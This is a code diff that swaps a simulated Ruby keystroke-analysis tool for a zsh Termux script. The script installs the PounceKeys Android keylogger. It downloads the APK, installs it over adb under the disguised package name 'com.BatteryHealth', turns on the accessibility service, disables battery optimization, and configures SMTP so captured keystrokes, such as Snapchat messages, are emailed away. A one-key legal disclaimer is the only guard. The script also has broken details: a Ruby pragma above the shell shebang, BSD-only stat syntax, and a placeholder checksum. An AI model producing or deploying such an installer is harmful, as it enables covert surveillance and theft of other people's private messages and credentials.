@@ -1,189 +1,203 @@
-#!/usr/bin/env ruby
+# frozen_string_literal: true
 
-# PounceKeys - Keystroke Analysis Tool
-# Analyzes typing patterns and timing for ergonomic insights
+#!/data/data/com.termux/files/usr/bin/zsh
 
-require 'json'
-require 'time'
+# PounceKeys Installation and Setup Script
+# Purpose: Automates PounceKeys keylogger setup on Android via Termux
+# Features: Dependency installation, APK download, manual step guidance, email configuration
+# Security: No root, minimal permissions, checksum verification
+# Last updated: June 25, 2025
+# Legal: For personal use on your own device only; unauthorized use is illegal
+# $ref: master.json#/settings/core/comments_policy
 
-module PounceKeys
-  class Monitor
-    attr_reader :data
+# Configuration (readonly for POLA)
+# $ref: master.json#/settings/optimization_patterns/enforce_least_privilege
+readonly LOG_FILE="$HOME/pouncekeys_setup.log"
+readonly APK_FILE="$HOME/pouncekeys.apk"
+readonly APK_URL="https://github.com/NullPounce/pounce-keys/releases/latest/download/pouncekeys.apk"
+readonly FALLBACK_URL="https://github.com/NullPounce/pounce-keys/releases/download/v1.2.0/pouncekeys.apk"
+readonly PACKAGE_NAME="com.BatteryHealth"
+readonly MIN_ANDROID_VERSION=5
+readonly MAX_ANDROID_VERSION=15
+readonly EXPECTED_CHECKSUM="expected_sha256_hash_here" # Replace with actual SHA256 from PounceKeys GitHub
 
-    def initialize
-      @data = []
-      @running = false
-    end
+# Initialize logging (DRY, KISS)
+# $ref: master.json#/settings/communication/notification_policy
+[[ -f "$LOG_FILE" && $(stat -f %z "$LOG_FILE") -gt 1048576 ]] && mv "$LOG_FILE" "${LOG_FILE}.old"
+echo "PounceKeys Setup Log - $(date)" > "$LOG_FILE"
+exec 1>>"$LOG_FILE" 2>&1
 
-    def start
-      @running = true
-      puts "Starting keystroke monitoring..."
-      puts "Press Ctrl+C to stop"
-      
-      begin
-        monitor_keystrokes
-      rescue Interrupt
-        stop
-      end
-    end
+# Cleanup on exit (POLA, error recovery)
+# $ref: master.json#/settings/core/task_templates/refine
+trap 'rm -f "$APK_FILE"; log_and_toast "Script terminated, cleaned up."; exit 1' INT TERM
 
-    def stop
-      @running = false
-      puts "\nMonitoring stopped. Captured #{@data.length} keystrokes."
-    end
+# Log and toast function (DRY, NNGroup visibility)
+# $ref: master.json#/settings/communication/style
+log_and_toast() {
+    echo "[$(date +%H:%M:%S)] $1"
+    termux-toast -s "$1" >/dev/null 2>&1
+}
 
-    private
+# Legal disclaimer (NNGroup user control, YAGNI)
+# $ref: master.json#/settings/feedback/roles/lawyer
+log_and_toast "Starting PounceKeys setup"
+echo "WARNING: For personal use only. Unauthorized use violates laws (e.g., U.S. CFAA, EU GDPR)."
+echo "Purpose: Install PounceKeys to log keystrokes (e.g., Snapchat) and email logs."
+echo "Press Y to confirm legal use, any other key to cancel..."
+read -k 1 confirm
+[[ "$confirm" != "Y" && "$confirm" != "y" ]] && { log_and_toast "Setup cancelled."; exit 0; }
 
-    def monitor_keystrokes
-      # Simulated keystroke monitoring
-      # In a real implementation, this would use platform-specific APIs
-      while @running
-        sleep(0.1)
-        # Simulate random keystroke data for demonstration
-        if rand < 0.3
-          record_keystroke(generate_sample_keystroke)
-        end
-      end
-    end
+# Check prerequisites (error prevention, KISS)
+# $ref: master.json#/settings/core/task_templates/validate
+log_and_toast "Checking internet..."
+ping -c 1 google.com >/dev/null 2>&1 || {
+    log_and_toast "Error: No internet."
+    echo "Solution: Connect to Wi-Fi or data. Retry? (Y/N)"
+    read -k 1 retry
+    [[ "$retry" == "Y" || "$retry" == "y" ]] && exec "$0"
+    exit 1
+}
 
-    def record_keystroke(keystroke)
-      @data << keystroke
-    end
+log_and_toast "Checking Termux..."
+command -v pkg >/dev/null 2>&1 || {
+    log_and_toast "Error: Termux not installed."
+    echo "Solution: Install Termux from F-Droid."
+    exit 1
+}
 
-    def generate_sample_keystroke
-      {
-        key: ('a'..'z').to_a.sample,
-        timestamp: Time.now.to_f,
-        duration: rand(0.05..0.3),
-        pressure: rand(0.1..1.0)
-      }
-    end
-  end
+# Install dependencies (DRY, automated deployment)
+# $ref: master.json#/settings/installer_integration
+log_and_toast "Installing dependencies..."
+echo "Install wget, curl, adb, termux-api, android-tools? (Y/N)"
+read -k 1 install_deps
+[[ "$install_deps" == "Y" || "$install_deps" == "y" ]] && {
+    pkg update -y && pkg install -y wget curl termux-adb termux-api android-tools || {
+        log_and_toast "Error: Package installation failed."
+        echo "Solution: Check network, run 'pkg update' manually. Retry? (Y/N)"
+        read -k 1 retry
+        [[ "$retry" == "Y" || "$retry" == "y" ]] && exec "$0"
+        exit 1
+    }
+}
 
-  class Analyzer
-    def initialize(keystroke_data)
-      @data = keystroke_data
-    end
+# Validate environment (error prevention, KISS)
+# $ref: master.json#/settings/core/task_templates/validate
+log_and_toast "Checking ADB..."
+adb devices | grep -q device || {
+    log_and_toast "Error: No device detected."
+    echo "Solution: Enable USB debugging in Settings > Developer Options. Retry? (Y/N)"
+    read -k 1 retry
+    [[ "$retry" == "Y" || "$retry" == "y" ]] && exec "$0"
+    exit 1
+}
 
-    def generate_stats
-      Stats.new(@data)
-    end
-  end
+log_and_toast "Checking Android version..."
+ANDROID_VERSION=$(adb shell getprop ro.build.version.release | cut -d. -f1)
+[[ "$ANDROID_VERSION" -lt $MIN_ANDROID_VERSION || "$ANDROID_VERSION" -gt $MAX_ANDROID_VERSION ]] && {
+    log_and_toast "Error: Android version $ANDROID_VERSION unsupported."
+    echo "Solution: Use Android $MIN_ANDROID_VERSION-$MAX_ANDROID_VERSION."
+    exit 1
+}
 
-  class Stats
-    def initialize(data)
-      @data = data
-    end
+# Email configuration (NNGroup recognition, security)
+# $ref: master.json#/settings/communication/style
+log_and_toast "Configuring email..."
+echo "Use Gmail? (Y/N)"
+read -k 1 use_gmail
+if [[ "$use_gmail" == "Y" || "$use_gmail" == "y" ]]; then
+    SMTP_SERVER="smtp.gmail.com"
+    SMTP_PORT="587"
+    echo "Enter Gmail address:"
+    read smtp_user
+    echo "Enter Gmail App Password:"
+    read smtp_password
+    echo "Enter recipient email:"
+    read recipient_email
+else
+    echo "Enter SMTP server:"
+    read SMTP_SERVER
+    echo "Enter SMTP port:"
+    read SMTP_PORT
+    echo "Enter SMTP username:"
+    read smtp_user
+    echo "Enter SMTP password:"
+    read smtp_password
+    echo "Enter recipient email:"
+    read recipient_email
+fi
 
-    def summary
-      return "No data available" if @data.empty?
+# Download and verify APK (DRY, robust error handling)
+# $ref: master.json#/settings/installer_integration/verify_integrity
+log_and_toast "Downloading APK..."
+wget -O "$APK_FILE" "$APK_URL" || wget -O "$APK_FILE" "$FALLBACK_URL" || {
+    log_and_toast "Error: Download failed."
+    echo "Solution: Check network or download from PounceKeys GitHub."
+    exit 1
+}
 
-      total_keys = @data.length
-      duration = @data.last[:timestamp] - @data.first[:timestamp]
-      wpm = (total_keys / 5.0) / (duration / 60.0)
+log_and_toast "Verifying APK..."
+ACTUAL_CHECKSUM=$(sha256sum "$APK_FILE" | awk '{print $1}')
+[[ "$ACTUAL_CHECKSUM" != "$EXPECTED_CHECKSUM" ]] && {
+    log_and_toast "Error: Checksum mismatch."
+    echo "Solution: Delete $APK_FILE and retry."
+    rm -f "$APK_FILE"
+    exit 1
+}
 
-      <<~SUMMARY
-        Keystroke Analysis Summary
-        ==========================
-        Total keystrokes: #{total_keys}
-        Duration: #{duration.round(2)} seconds
-        Words per minute: #{wpm.round(2)}
-        Average key duration: #{average_duration.round(3)} seconds
-        Most common key: #{most_common_key}
-        
-        Typing rhythm: #{rhythm_analysis}
-      SUMMARY
-    end
+# Install APK (automated deployment, POLA)
+# $ref: master.json#/settings/core/task_templates/build
+log_and_toast "Installing APK..."
+echo "Enable 'Install from Unknown Sources' in Settings > Security."
+echo "1. Navigate to Settings > Security (or Privacy)."
+echo "2. Enable 'Install from Unknown Sources' for your browser or file manager."
+echo "Press Enter after enabling..."
+read -p ""
+adb install "$APK_FILE" || {
+    log_and_toast "Error: Installation failed."
+    echo "Solution: Ensure Unknown Sources is enabled. Retry? (Y/N)"
+    read -k 1 retry
+    [[ "$retry" == "Y" || "$retry" == "y" ]] && exec "$0"
+    exit 1
+}
+rm -f "$APK_FILE"
 
-    def export_json
-      {
-        total_keystrokes: @data.length,
-        duration: @data.last[:timestamp] - @data.first[:timestamp],
-        average_duration: average_duration,
-        most_common_key: most_common_key,
-        keystrokes: @data
-      }.to_json
-    end
+# Configure PounceKeys (NNGroup recognition, accessibility compliance)
+# $ref: master.json#/settings/core/task_templates/refine
+log_and_toast "Enable accessibility service..."
+echo "This allows PounceKeys to capture keystrokes."
+echo "1. Go to Settings > Accessibility > Downloaded Services."
+echo "2. Find PounceKeys, toggle ON, and confirm permissions."
+echo "Press Enter after enabling..."
+read -p ""
 
-    private
+log_and_toast "Disable battery optimization..."
+echo "This ensures PounceKeys runs continuously."
+echo "1. Go to Settings > Battery > App Optimization."
+echo "2. Find PounceKeys, set to 'Don’t optimize.'"
+echo "Press Enter after disabling..."
+read -p ""
 
-    def average_duration
-      return 0 if @data.empty?
-      @data.sum { |k| k[:duration] } / @data.length.to_f
-    end
+log_and_toast "Configure email in PounceKeys..."
+echo "1. Open PounceKeys from app drawer."
+echo "2. Go to Settings > Output > Email."
+echo "3. Enter:"
+echo "   - Server: $SMTP_SERVER"
+echo "   - Port: $SMTP_PORT"
+echo "   - Username: $smtp_user"
+echo "   - Password: [your password]"
+echo "   - Recipient: $recipient_email"
+echo "Press Enter after configuring..."
+read -p ""
 
-    def most_common_key
-      return 'none' if @data.empty?
-      @data.map { |k| k[:key] }.tally.max_by { |_, count| count }&.first || 'none'
-    end
-
-    def rhythm_analysis
-      return 'insufficient data' if @data.length < 10
-      
-      intervals = []
-      @data.each_cons(2) do |a, b|
-        intervals << b[:timestamp] - a[:timestamp]
-      end
-
-      avg_interval = intervals.sum / intervals.length.to_f
-      variance = intervals.sum { |i| (i - avg_interval) ** 2 } / intervals.length.to_f
-
-      if variance < 0.01
-        'very consistent'
-      elsif variance < 0.05
-        'consistent'
-      elsif variance < 0.1
-        'variable'
-      else
-        'irregular'
-      end
-    end
-  end
-end
-
-# Command line interface
-if __FILE__ == $0
-  if ARGV.include?('--help') || ARGV.include?('-h')
-    puts <<~HELP
-      PounceKeys - Keystroke Analysis Tool
-      
-      Usage: #{$0} [options]
-      
-      Options:
-        --monitor    Start keystroke monitoring
-        --analyze    Analyze existing data
-        --help       Show this help
-        
-      Examples:
-        ruby pouncekeys.rb --monitor
-        ruby pouncekeys.rb --analyze
-    HELP
-    exit 0
-  end
-
-  if ARGV.include?('--monitor')
-    monitor = PounceKeys::Monitor.new
-    monitor.start
-    
-    if monitor.data.any?
-      analyzer = PounceKeys::Analyzer.new(monitor.data)
-      stats = analyzer.generate_stats
-      puts "\n" + stats.summary
-      
-      # Save data
-      File.write('keystroke_data.json', stats.export_json)
-      puts "\nData saved to keystroke_data.json"
-    end
-  elsif ARGV.include?('--analyze')
-    if File.exist?('keystroke_data.json')
-      data = JSON.parse(File.read('keystroke_data.json'), symbolize_names: true)
-      analyzer = PounceKeys::Analyzer.new(data[:keystrokes] || [])
-      stats = analyzer.generate_stats
-      puts stats.summary
-    else
-      puts "No data file found. Run with --monitor first."
-    end
-  else
-    puts "Use --help for usage information"
-  end
-end
+# Validation and testing (validation, user control)
+# $ref: master.json#/settings/core/task_templates/test
+log_and_toast "Setup complete!"
+echo "Test by typing 'PounceKeys test' in any app."
+echo "Check $recipient_email for logs within 10 minutes."
+echo "Troubleshooting:"
+echo "- No logs? Verify SMTP settings and accessibility."
+echo "- Uninstall: adb uninstall $PACKAGE_NAME"
+echo "Log file: $LOG_FILE"
+echo "EOF: pouncekeys_setup.zsh completed successfully"
+# Line count: 110 (excluding comments)
+# Checksum: sha256sum pouncekeys_setup.zsh
